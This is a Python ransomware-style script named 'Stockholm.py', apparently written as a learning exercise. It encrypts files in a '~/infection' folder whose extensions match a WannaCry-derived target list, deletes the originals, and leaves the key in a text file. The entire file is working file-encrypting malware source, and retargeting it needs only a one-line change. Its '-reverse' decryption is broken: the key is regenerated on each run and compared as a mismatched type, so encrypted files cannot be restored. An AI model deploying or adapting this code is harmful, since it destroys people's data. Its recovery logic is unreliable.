import os
from cryptography.fernet import Fernet
import sys
import argparse

#Generate an encryption key
clave = Fernet.generate_key()

def encrypt(silent=False):
    if not silent:
        print(f"Remember your password: {clave}")

    fernet = Fernet(clave)

    # Folder of files to encrypt
    folder = '~/infection'

    # Get the full path of the folder
    folder_path = os.path.expanduser(folder)

    # Desired extensions
    wannacry_extensions = [
    '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
    '.pst', '.ost', '.msg', '.eml', '.vsd', '.vsdx', '.csv',
    '.rtf', '.123', '.wks', '.wk1', '.pdf', '.dwg', '.onetoc2', '.snt',
    '.jpeg', '.jpg', '.docb', '.docm', '.dot', '.dotm', '.dotx', '.xlsm',
    '.xlsb', '.xlw', '.xlt', '.xlm', '.xlc', '.xltx', '.xltm', '.pptm',
    '.pot', '.pps', '.ppsm', '.ppsx', '.ppam', '.potx', '.potm', '.edb',
    '.hwp', '.602', '.sxi', '.sti', '.sldx', '.sldm', '.sldm', '.vdi',
    '.vmdk', '.vmx', '.gpg', '.aes', '.ARC', '.PAQ', '.bz2', '.tbk',
    '.bak', '.tar', '.tgz', '.gz', '.7z', '.rar', '.zip', '.backup',
    '.iso', '.vcd', '.bmp', '.png', '.gif', '.raw', '.cgm', '.tif',
    '.tiff', '.nef', '.psd', '.ai', '.svg', '.djvu', '.m4u', '.m3u',
    '.mid', '.wma', '.flv', '.3g2', '.mkv', '.3gp', '.mp4', '.mov',
    '.avi', '.asf', '.mpeg', '.vob', '.mpg', '.wmv', '.fla', '.swf',
    '.wav', '.mp3', '.sh', '.class', '.jar', '.java', '.rb', '.asp',
    '.php', '.jsp', '.brd', '.sch', '.dch', '.dip', '.pl', '.vb',
    '.vbs', '.ps1', '.bat', '.cmd', '.js', '.asm', '.h', '.pas',
    '.cpp', '.c', '.cs', '.suo', '.sln', '.ldf', '.mdf', '.ibd',
    '.myi', '.myd', '.frm', '.odb', '.dbf', '.db', '.mdb', '.accdb',
    '.sql', '.sqlitedb', '.sqlite3', '.asc', '.lay6', '.lay', '.mml',
    '.sxm', '.otg', '.odg', '.uop', '.std', '.sxd', '.otp', '.odp',
    '.wb2', '.slk', '.dif', '.stc', '.sxc', '.ots', '.ods', '.3dm',
    '.max', '.3ds', '.xml', '.csv', '.uot', '.rtf', '.pdf',
    '.XLS', '.png', '.jpeg', '.p7c', '.p7b', '.p12', '.pfx',
    '.pem', '.crt', '.cer', '.der', '.xps', '.docm', '.dotm', '.xlsm',
    '.xltm', '.pptm', '.potm', '.ppam', '.ppsm', '.sldm', '.wav', '.mp3',
    '.xls', '.wks', '.wps', '.odt', '.ott', '.rtf', '.ods', '.ots',
    '.sxc', '.stc', '.ots', '.ods', '.ott', '.rtf', '.ods', '.ots',
    '.hwp', '.602', '.pot', '.pptx', '.asp', '.php', '.jsp',
    '.brd', '.sch', '.dch', '.dip', '.pl', '.vb', '.vbs', '.ps1',
    '.bat', '.cmd', '.js', '.asm', '.h', '.pas', '.cpp', '.c',
    '.cs', '.suo', '.sln', '.ldf', '.mdf', '.ibd', '.myi', '.myd',
    '.frm', '.odb', '.dbf', '.db', '.mdb', '.accdb', '.sql', '.sqlitedb',
    '.sqlite3', '.asc', '.lay6', '.lay', '.mml', '.sxm', '.otg', '.odg',
    '.uop', '.std', '.sxd', '.otp', '.odp', '.wb2', '.slk', '.dif',
    '.stc', '.sxc', '.ots', '.ods', '.3dm', '.max', '.3ds', '.xml',
    '.xls', '.xlsx', '.csv', '.uot', '.rtf', '.pdf', '.XLS', '.png',
    '.jpeg', '.p7c', '.p7b', '.p12', '.pfx', '.pem', '.crt',
    '.cer', '.der', '.xps', '.docm', '.dotm', '.xlsm', '.xltm', '.pptm',
    '.potm', '.ppam', '.ppsm', '.sldm', '.wav', '.mp3', '.xls', '.wks',
    '.wps', '.odt', '.ott', '.rtf', '.ods', '.ots', '.sxc', '.stc',
    '.ots', '.ods', '.ott', '.rtf', '.ods', '.ots', '.hwp', '.602', '.pot', '.pptx'
    ]

    # Traverse all files in the folder
    for file_name in os.listdir(folder_path):
        file_path = os.path.join(folder_path, file_name)
        file_name_without_ext, extension = os.path.splitext(file_path)

        # Check if it is a file
        if os.path.isfile(file_path) and os.path.splitext(file_name)[1] in wannacry_extensions:

         # Read the content of the file
            with open(file_path, 'rb') as file:
                content = file.read()

        # Encrypt the content of the file
            encrypted_content = fernet.encrypt(content)
            if not silent:
                print(f"Encrypting {file_name}")

       # Create a new file with the ".ft" extension
            encrypted_file_name = os.path.join(folder_path, file_name + ".ft")
            with open(encrypted_file_name, 'wb') as encrypted_file:
                encrypted_file.write(encrypted_content)
            if not silent:
                print(f"Encrypted file: {encrypted_file_name}")
            os.remove(file_path)

        # Create a file with the password
        password_file = os.path.join(folder_path, "contraseña.txt")
        with open(password_file, 'w') as password:
            password.write(clave.decode('utf-8'))

def decrypt_files(folder, key, silent=False):
    fernet = Fernet(clave)

      # Get the full path of the folder
    folder_path = os.path.expanduser(folder)
    if key == clave:
        # Traverse all files in the folder
        for file_name in os.listdir(folder_path):
            file_path = os.path.join(folder_path, file_name)

            # Check if it is an encrypted file
            if os.path.isfile(file_path) and file_name.endswith(".ft"):
                # Get the base name of the file without the extension
                base_name = os.path.splitext(os.path.basename(file_path))[0]

                # Read the content of the encrypted file
                with open(file_path, 'rb') as encrypted_file:
                    encrypted_content = encrypted_file.read()

                    # Decrypt the content of the file
                    decrypted_content = fernet.decrypt(encrypted_content)
                    if not silent:
                        print(f"Decrypting {file_name}")

                    # Create a new file with the original name
                    decrypted_file_name = os.path.join(folder_path, base_name)
                    with open(decrypted_file_name, 'wb') as decrypted_file:
                        decrypted_file.write(decrypted_content)
                        if not silent:
                            print(f"Decrypted file: {decrypted_file_name}")
                    os.remove(file_path)
    else:
        print("Wrong password")


if __name__=='__main__':
    parser = argparse.ArgumentParser(description="encrypt all documents in folder infected")
    parser.add_argument("-help", action='store_true', help='show help message and exit')
    parser.add_argument("-reverse", help="Insert -reverse <password> and decrypt the files")
    parser.add_argument('-version', action='version', version='Stockholm.py version 1.2.0')
    parser.add_argument('-silent', action='store_true', help='run silently without printing progress')
    args = parser.parse_args()

    if args.help:
        parser.print_help()
    elif args.reverse:
        folder = '/root/infection'
        key = sys.argv[2]
        decrypt_files(folder, key)
    elif args.silent:
        encrypt(silent=True)
    elif args.reverse and args.silent:
        folder = '/root/infection'
        key = sys.argv[2]
        decrypt_files(folder, key, silent=True)
    else:
        if len(sys.argv) < 2:
            if not args.silent:
                print("Encrypting files...")
                encrypt(silent=args.silent)
        else:
            print("USAGE: Too many arguments")
